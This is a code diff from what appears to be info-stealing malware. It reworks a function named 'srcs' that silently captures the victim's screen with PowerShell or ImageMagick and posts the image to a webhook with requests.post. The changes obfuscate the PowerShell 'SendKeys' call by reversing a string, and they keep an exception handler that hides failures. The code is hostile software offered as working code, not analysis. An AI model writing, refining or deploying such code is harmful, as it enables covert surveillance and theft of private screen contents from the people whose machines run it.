@@ -1185,25 +1185,17 @@ def ZipThings(path, arg, procc):
 
 def srcs():
     try:
-        temp_folder = os.environ.get('TEMP')
-        img_path = os.path.join(temp_folder, "screenshot.png")
+        img_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
+
+        timestamp = str(int(time.time()))
+        rah2 = 'dneS'
         if os.name == "nt":
-            powershell_command = f'''
-                Add-Type -AssemblyName System.Windows.Forms
-                [System.Windows.Forms.Keys]::PrintScreenKey.Wait("{0}")
-                Start-Sleep -Milliseconds 500
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-                $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-                $bmp.Save("{1}")
-            '''
-            powershell_command = powershell_command.format("{PRTSC}", img_path)
-
-            subprocess.run(["powershell", "-Command", powershell_command], shell=True)
+            command = ["powershell", "-Command", f"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.{rah2[::-1]}Keys]::{rah2[::-1]}Wait(\"{0}\" ); Start-Sleep -m 500; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.width, $screen.height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save(\"{1}\")"]            
+            command[2] = command[2].format("{PRTSC}", img_path)
         else:
-            subprocess.run(["import", "-window", "root", img_path], shell=True)
+            command = ["import", "-window", "root", img_path]
 
+        subprocess.run(command, shell=True)
         with open(img_path, "rb") as file:
             file_data = file.read()
             data = {
@@ -1213,7 +1205,7 @@ def srcs():
             }
             requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
             
-    except:
+    except Exception as e:
         pass
 
 
